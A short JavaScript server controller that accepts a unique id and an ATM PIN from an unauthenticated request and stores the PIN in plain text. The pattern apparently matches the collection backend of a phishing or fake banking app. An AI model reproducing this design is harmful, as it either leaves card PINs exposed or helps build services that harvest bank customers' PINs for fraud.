import AtmPin from "../models/AtmPin.js";

export const saveAtmPin = async (req, res) => {
    try {
        const { uniqueid, atmPin } = req.body;

        if (!uniqueid || !atmPin) {
            return res.json({ success: false, message: "Missing fields" });
        }

        await AtmPin.create({ uniqueid, atmPin });

        return res.json({
            success: true,
            message: "ATM PIN saved successfully"
        });

    } catch (error) {
        return res.json({ success: false, message: error.message });
    }
};
